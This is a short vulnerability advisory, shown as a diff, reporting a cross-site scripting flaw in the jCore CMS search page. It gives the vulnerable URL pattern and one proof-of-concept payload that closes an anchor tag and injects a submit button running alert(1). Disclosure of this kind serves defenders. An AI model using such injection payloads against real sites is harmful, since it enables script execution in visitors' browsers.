@@ -1,0 +1,15 @@
+Found: loneferret
+Vendor: jCore
+Site: http://www.jcore.net/home
+Software link: http://www.jcore.net/downloads
+
+Search page is vulnerable to cross-site scripting.
+
+Exploit:
+http://server/modules/search?search=[xss here]
+http://server/modules/search?search=</a>[xss here]
+
+Example:
+The result page will screw up. Hit the back button and you newly created
+submit input type will be there. Fully functional.
+http://server/modules/search?search=</a><input value="xss" onclick="alert(1)" type="submit">
